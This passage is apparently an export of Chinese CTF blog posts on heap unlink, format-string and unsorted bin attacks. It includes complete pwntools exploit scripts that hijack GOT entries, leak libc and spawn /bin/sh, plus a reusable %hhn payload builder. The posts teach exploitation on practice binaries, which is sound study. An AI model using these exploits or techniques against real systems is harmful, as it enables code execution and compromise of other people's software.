fack_chunk的fd指向的“chunk”的bk指向它，fack_chunk的bk指向的“chunk”指向它，从而成功绕过检测。\nfakeFD -&gt; bk == P1 *(&amp;fakeFD + 0x18) == P1 *fakeFD == &amp;P1 - 0x18fakeBK -&gt; fd == P1 *(&amp;fakeBK + 0x10) == P1 *fakeBK == &amp;P1 - 0x10\n保护3更简单了，直接不申请largebin大小的chunk即可。\n四、 例题分析题目来源：[2014_hitccon_stkof]先检查一下保护，看一下文件的ELF信息\n可以看到是64位小端序，开启了canary和nx，got表可写\n丢到ida里面看一看（为了方便查看，改了一些函数和变量的名字）main函数\ncreat函数\ndelete函数\nedit函数\n还有一个没什么用的函数，这里就不管他了。\n通过分析程序的主要函数，我们发现申请的堆块的指针都在存放在bss段的一个数组（后面叫做list）中，并且edit函数输入的字节数目由我们自己控制，所以存在溢出。所以这道题可以用unlink来做。前置准备：\ndef cmd(choicce):    p.sendline(str(choicce).encode())def add(size):    cmd(1)    p.sendline(str(size).encode())def edit(index,size,content):    cmd(2)    p.sendline(str(index).encode())    p.sendline(str(size).encode())    p.send(content)def delete(index):    cmd(3)    p.sendline(str(index).encode())\n所以思路就很清晰了：我们先申请四个堆块（第一个用后续操作，第二个就是我们用来制作fack chunk的，第三个用来触发unlink，堆块四用来chunk防止与top chunk合并）\nadd(0x80)# 1   p.recvuntil(b&#x27;OK\\n&#x27;)add(0x80)# 2p.recvuntil(b&#x27;OK\\n&#x27;)add(0x80)# 3   p.recvuntil(b&#x27;OK\\n&#x27;)add(0x20)# 4\n\n然后通过edit第二个堆块来制造fack chunk并溢出到第三个堆块，修改他的prev_size和prev_inuse\nchunks =  0x602140aim = chunks + 0x10#chunk2_addrfd = aim - 0x18bk = aim - 0x10#fake_chunkp.recvuntil(b&#x27;OK\\n&#x27;)payload1 = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b&#x27;a&#x27;*0x60 + p64(0x80) + p64(0x90)edit(2,0x90,payload1)\n此时，chunk2内存是这样的\n接着free第三个堆块触发unlink，这个时候原来存放第二个堆块的指针(list[2])的位置就被写入了 &amp;list -0x8\n后面我们就可以通过edit堆块2去修改list中存放的值，我们将chunk_list[1]、chunk_list[2]、chunk_list[3]的值分别改为free、puts、atoi的got表地址然后通过edit堆块1，实现修改free_got为 puts_plt ，然后free堆块2就能泄露puts函数的真实地址，据此算出libc_base然后edit堆块3将atoi_got改为system的地址，最后输入/bin/sh就能getshell\n完整的exp如下\nfrom pwn import *context(log_level=&#x27;debug&#x27; , os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)pwnfile = &#x27;./pwn&#x27;elf = ELF(pwnfile)libc = elf.libcis_remote = 0if (remote):    p = remote(&#x27;node5.buuoj.cn&#x27;, 26221)else:    p = process(pwnfile)def cmd(choicce):    p.sendline(str(choicce).encode())def add(size):    cmd(1)    p.sendline(str(size).encode())def edit(index,size,content):    cmd(2)    p.sendline(str(index).encode())    p.sendline(str(size).encode())    p.send(content)def delete(index):    cmd(3)    p.sendline(str(index).encode())if __name__ == &#x27;__main__&#x27;:    chunks =  0x602140    aim = chunks + 0x10    fd = aim - 0x18    bk = aim - 0x10        puts_plt = elf.plt[&#x27;puts&#x27;]    free_got = elf.got[&#x27;free&#x27;]    fread_got = elf.got[&#x27;fread&#x27;]    puts_got = elf.got[&#x27;puts&#x27;]    atoi_got = elf.got[&#x27;atoi&#x27;]        add(0x80)#       p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x80)#        p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x80)#       p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x20)#     #gdb.attach(p)    #fake_chunk        p.recvuntil(b&#x27;OK\\n&#x27;)    payload1 = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b&#x27;a&#x27;*0x60 + p64(0x80) + p64(0x90)    edit(2,0x90,payload1)        p.recvuntil(b&#x27;OK\\n&#x27;)    delete(3)    p.recvuntil(b&#x27;OK\\n&#x27;)    payload2 = b&#x27;a&#x27;*0x10 + p64(free_got) + p64(puts_got) + p64(atoi_got)     edit( 2 , len(payload2) , payload2)    p.recvuntil(b&#x27;OK\\n&#x27;)    edit( 1 , 0x8 , p64(puts_plt))        p.recvuntil(b&#x27;OK\\n&#x27;)    delete(2)    puts_addr = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))    success(&quot;puts_addr: &quot; + hex(puts_addr))    libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]    success(&quot;libc_base: &quot; + hex(libc_base))    system_addr = libc_base + libc.symbols[&#x27;system&#x27;]    success(&quot;system_addr: &quot; + hex(system_addr))    #gdb.attach(p)    p.recvuntil(b&#x27;OK\\n&#x27;)    edit( 3 , 0x8 , p64(system_addr))        pause()    p.sendline(b&#x27;/bin/sh\\x00&#x27;)    p.interactive()","categories":["PWN"],"tags":["heap","Unlink"]},{"title":"格式化字符串漏洞","url":"/2025/06/17/fmt%E5%88%9D%E8%AF%86/","content":"\n\n格式化字符串漏洞一、知识储备1. 格式化字符串是什么在C语言中，我们经常会使用到printf之类的函数来输出，printf函数的第一个参数就是一个格式化字符串。在格式化字符串中，我们可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。例如：更多关于格式化字符串的教程可以这里查看在此我就不过多说明了。\n2. 漏洞原理我们可以使用%数字+$的形式，指定参数相对于格式化字符串的偏移，我们来看看这个程序的运行结果传入参数的顺序没有变化，但是输出参数的顺序改变了。%4$s %3$s %2$s %1$s分别对应格式化字符串后面的第4、3、2、1个参数。因此通过以上操作（在权限允许的范围内）我们就能够实现：\n\n任意地址泄露：使用%+数字+$\n任意地址写入：%数字c%数字$n\n\n二、例题分析（题目附件放在文末）1.babyfmt拿到题目先检查保护措施并运行一遍。了解基本情况之后，我们用ida来看看程序的运行逻辑。main函数非常简单，只调用了一个dofunc函数。程序的运行逻辑非常简单，只要v1等于100就可以getshell了。（当然，溢出的方法能做，这里主要讲格式化字符串的方法。）所以思路非常简单，我们只需要通过格式化字符串修改v1的值为100就可以了。首先我们要获取rbp的位置，我们可以通过读取rbp中的值，然后再把拿到的值减去0x10就是当前rbp的值，然后再减去0x8就时我们要修改的内存部分了。我们先来动态调试看一下rbp相对于格式化字符串的位置。可以看到，rsp和rbp相距0x40字节，所以偏移就是5 + 64&#x2F;8 + 1 &#x3D; 14（5指的除了rdi之外的另外5个用于参数传递的寄存器），我们的payload1就构造好了。payload1 = payload1 = b&#39;%14$p&#39;然后我们接收，并将这个地址减去0x18就是rbp-8的地址了。拿到地址之后我们再通过%100c%x$hhn就能够修改这个地址的值了。下面，我们来计算处x的值。先如下构造payload2。payload2 = b&quot;%100c%x$hhn&quot; +b&#39;a&#39;*0x5 + p64(rbp_8_addr)(a用于对齐)然后gdb动调。那么x &#x3D; 5 + 48&#x2F;8 + 1 &#x3D; 12。所以payload2如下：payload2 = b&quot;%100c%12$hhnaaaa&quot; + p64(rbp_8_addr)\n到此这道题就做完了。完整的exp如下：\nfrom pwn import *if __name__==&#x27;__main__&#x27;:    context(log_level=&#x27;debug&#x27; , arch=&#x27;amd64&#x27; , os=&#x27;linux&#x27;)    elf = ELF(&#x27;./babyfmt&#x27;)    io =process(&quot;./babyfmt&quot;)    gdb.attach(io)    #payload = b&#x27;a&#x27; * 0x18 + p64(100)    payload1 = b&#x27;%14$p&#x27;    io.sendafter(&quot;input:\\n&quot; , payload1)    stack = int(io.recvline()[ 2 : 14] , 16)    print(&quot;stack:&quot; , hex(stack))    value_addr = stack - 0x18    payload2 = b&quot;%100c%12$hhnaaaa&quot; + p64(value_addr)    io.send(payload2)    io.interactive()\n\n\n2.fmt_str_level_1_x86拿到题目还是先查看一下保护措施，然后运行一下。了解基本情况之后，我们用ida来看看程序的运行逻辑。main函数非常简单，只调用了一个dofunc函数，我们直接分析这个dofunc函数。\n这次没有system给我们跳转了，但是got表时可写的，所以我们可以通过修改printf函数的地址为system的地址然后参数传入**&#x2F;bin&#x2F;sh**来getshell。\n由于这道题开启了PIE所以我们无法直接从IDA读取地址，我们先通过格式化字符串漏洞泄露函数返回值的地址（就是main函数中 call dofunc之后的下一条指令）然后找到main函数的入口地址，main函数的入口地址减去main函数与printf函数的got表地址之间的偏移量就可以获得printf函数的got表的地址了。通过动态调试得知，dofunc函数的返回地址相对于格式化字符串的偏移为75（32位程序的计算直接数就好了，这里就不带着去找了），所以payload1如下：payload1 = b&#39;%75$p&#39;接收got表的地址并处理如下：\nmain_addr = main_p30_addr - 30print(&quot;main_addr:&quot; , hex(main_addr))offset = elf.symbols[&#x27;main&#x27;] - elf.got[&#x27;printf&#x27;]printf_got_addr = main_addr - offsetprint(&quot;printf_got_addr:&quot; , hex(printf_got_addr))\n下一步我们就是要读取printf的got表拿到printf函数的真实地址了，payload2如下：payload2 = p32(printf_got_addr) + b&#39;%7$s\\x00&#39;接收到真实地址之后我们需要计算出system函数和**&#x2F;bin&#x2F;sh的地址**（和普通的libc题目一样），相关代码如下：\nprint_real_addr = u32(io.recv(8)[ 4 : 8])print(&quot;print_real_addr:&quot; , hex(print_real_addr))libcbase = print_real_addr - libc.sym[&quot;printf&quot;]sys_addr = libcbase + libc.sym[&quot;system&quot;]binsh_addr = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))print(&quot;sys_addr:&quot; , hex(sys_addr))print(&quot;binshi_addr:&quot; , hex(binsh_addr))\n下一步我们需要通过%n改地址。但是由于地址是一个十分大的数字，直接使用%n改掉可能会引发崩溃，所以这里我们一个字节一个字节地改地址。老规矩，我们通过动调找到了第一个字节的地址相对于格式化字符串的偏移量位7，由于要修改4次地址，我们简单的写一个脚本帮我们构造payload。\ndef fmt(prev, word, index):    fmtstr = &quot;&quot;    if prev &lt; word:        result = word - prev        fmtstr += &quot;%&quot; + str(result) + &quot;c&quot;    elif prev == word:        result = 0    else:        result = 256 + word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;    return fmtstr.encode(&#x27;utf-8&#x27;)def fmt_str(offset, size, addr, target):    # offset 偏移位置  size 32?64  addr写入地址   target 写入内容    payload = b&quot;&quot;    for i in range(4):        if size == 4:            payload += p32(addr + i)        else:            payload += p64(addr + i)    prev = len(payload)    for i in range(4):        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)        prev = (target &gt;&gt; i * 8) &amp; 0xff    return payload\n然后我们调用这个函数来生成payload3payload3 = fmt_str( 7 , 4 , printf_got_addr , sys_addr)最后我们只需要把**&#x2F;bin&#x2F;sh**传过去就可以了。payload4如下payload4 = p32(binsh_addr)\n完整的exp如下：\nfrom pwn import *def fmt(prev, word, index):    fmtstr = &quot;&quot;    if prev &lt; word:        result = word - prev        fmtstr += &quot;%&quot; + str(result) + &quot;c&quot;    elif prev == word:        result = 0    else:        result = 256 + word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;    return fmtstr.encode(&#x27;utf-8&#x27;)def fmt_str(offset, size, addr, target):    # offset 偏移位置  size 32?64  addr写入地址   target 写入内容    payload = b&quot;&quot;    for i in range(4):        if size == 4:            payload += p32(addr + i)        else:            payload += p64(addr + i)    prev = len(payload)    for i in range(4):        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)        prev = (target &gt;&gt; i * 8) &amp; 0xff    return payloadif __name__==&#x27;__main__&#x27;:    context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]    pwnfile = &#x27;./fmt_str_level_1_x86&#x27;    elf = ELF(pwnfile)    libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)    io = process(pwnfile)   # gdb.attach(io)    payload1 = b&#x27;%75$p&#x27;    io.send(payload1)    io.recvuntil(&quot;input:\\n&quot;)    main_p30_addr = int(io.recv(10)[2 : 10] , 16 )    main_addr = main_p30_addr - 30    print(&quot;main_addr:&quot; , hex(main_addr))    offset = elf.symbols[&#x27;main&#x27;] - elf.got[&#x27;printf&#x27;]    printf_got_addr = main_addr - offset    print(&quot;printf_got_addr:&quot; , hex(printf_got_addr))    io.recvuntil(&quot;input:\\n&quot;)    payload2 = p32(printf_got_addr) + b&#x27;%7$s\\x00&#x27;    io.send(payload2)    print_real_addr = u32(io.recv(8)[ 4 : 8])    print(&quot;print_real_addr:&quot; , hex(print_real_addr))    libcbase = print_real_addr - libc.sym[&quot;printf&quot;]    sys_addr = libcbase + libc.sym[&quot;system&quot;]    binsh_addr = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))    print(&quot;sys_addr:&quot; , hex(sys_addr))    print(&quot;binshi_addr:&quot; , hex(binsh_addr))    io.recvuntil(&quot;input:\\n&quot;)    payload3 = fmt_str( 7 , 4 , printf_got_addr , sys_addr)    print( &quot;payload3:&quot; , payload3)    io.send(payload3)    io.recvuntil(&quot;input:\\n&quot;)    payload4 = p32(binsh_addr)    io.send(payload4)    io.interactive()\n题目附件\n","categories":["PWN"],"tags":["fmt"]},{"title":"Unsorted Bin Attack","url":"/2025/06/17/unsorterbin%20attack/","content":"\n\nunsorted bin Attack1. 概述Unsorted bin attack 自然是作用于Unsorted bin的，该攻击手段适用的libc版本是2.27及以下。条件是能够修改Unsorted Bin Chunk 的bk指针，这个攻击达到的效果就是在目标位置写入一个很大的值（main_arena + 88）\n2. 原理剖析在 glibc&#x2F;malloc&#x2F;malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。\nvictim = unsorted_chunks (av)-&gt;bkbck = victim-&gt;bkunsorted_chunks (av)-&gt;bk = bckbck-&gt;fd = unsorted_chunks (av)\n逐行来解释一下这个代码victim = unsorted_chunks (av)-&gt;bk ：将Unsorted Bin中的最后一个chunk给到victimbck = victim-&gt;bk ：将最后一个chunk的前一个ckunk给bckunsorted_chunks (av)-&gt;bk = bck ：让 main_arena 指向bckbck-&gt;fd = unsorted_chunks (av：将bck的fd指针修改为main_arena\n那么很显然，如果我们可以控制Unsorted Bin 中chunk 的 bk指针，我们就可以向其中写入一个地址\n\n*注意： 执行完 Unsorted Bin Attack 之后 Unsorted Bin 就损坏了，无法继续向里面放入chunk\n\n3. 应用示例我们用how2heap的源码进行演示\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    // 程序开始时的提示信息    fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\\n&quot;);    fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;\t\t   &quot;global variable global_max_fast in libc for further fastbin attack\\n\\n&quot;);    // 对应中文：    /*    fprintf(stderr, &quot;本程序演示如何通过 unsorted bin 攻击将一个大的无符号长整型值写入栈中。\\n&quot;);    fprintf(stderr, &quot;在实际攻击中，unsorted bin 攻击通常是为了进一步攻击做准备，例如修改 libc 中的全局变量 global_max_fast，以便进行 fastbin 攻击。\\n\\n&quot;);    */\tunsigned long stack_var=0;\tfprintf(stderr, &quot;Let&#x27;s first look at the target we want to rewrite on stack:\\n&quot;);\tfprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;stack_var, stack_var);    // 对应中文：    /*\tfprintf(stderr, &quot;首先，我们看一下栈上想要覆盖的目标变量：\\n&quot;);\tfprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;stack_var, stack_var);    */\tunsigned long *p=malloc(0x500);\tfprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\\n&quot;,p);\tfprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;           &quot;the first one during the free()\\n\\n&quot;);\tmalloc(0x600);    // 对应中文：    /*\tfprintf(stderr, &quot;现在，我们在堆上分配第一个正常内存块，地址为：%p\\n&quot;, p);\tfprintf(stderr, &quot;再分配另一个正常的内存块，目的是避免在释放第一个内存块时，top chunk 与其合并。\\n\\n&quot;);    */\tfree(p);\tfprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;\t\t   &quot;point to %p\\n&quot;,(void*)p[1]);    // 对应中文：    /*\tfprintf(stderr, &quot;我们现在已经释放了第一个内存块，它将被插入到 unsorted bin 中，其 bk 指针指向：%p\\n&quot;, (void*)p[1]);    */\t//------------VULNERABILITY-----------\tp[1]=(unsigned long)(&amp;stack_var-2);\tfprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);\tfprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\\n\\n&quot;,(void*)p[1]);\t//------------------------------------    // 对应中文：    /*\tfprintf(stderr, &quot;现在模拟一个可以覆盖 victim-&gt;bk 指针的漏洞。\\n&quot;);\tfprintf(stderr, &quot;我们将 victim-&gt;bk 写为目标地址减去 16（如果是 32 位机器，则应为目标地址减去 8）：%p\\n\\n&quot;, (void*)p[1]);    */\tmalloc(0x500);\tfprintf(stderr, &quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;\t\t   &quot;rewritten:\\n&quot;);\tfprintf(stderr, &quot;%p: %p\\n&quot;, &amp;stack_var, (void*)stack_var);&#125;    // 对应中文：    /*\tfprintf(stderr, &quot;再次调用 malloc 来获取我们刚刚释放的内存块。在这个过程中，目标变量应该已经被改写了：\\n&quot;);\tfprintf(stderr, &quot;%p: %p\\n&quot;, &amp;stack_var, (void*)stack_var);    */\n编译：gcc unsorted_bin_attack.c -no-pie -g -i test\n我们通过gdb来调试一下这个程序先来看看正常free后，Unsorted Bin中的情况\n在来看一看修改后的情况\n此时，目标地址+0x10的位置还是 0，我们执行malloc，触发 Unsorted Bin Attack 后看看这个位置\n可以看到，这个位置成功被我们修改成了 main_arena + 88\n至此，我们便完成了 Unsorted Bin Attack\n","categories":["PWN"],"tags":["heap","Unsorted Bin"]}]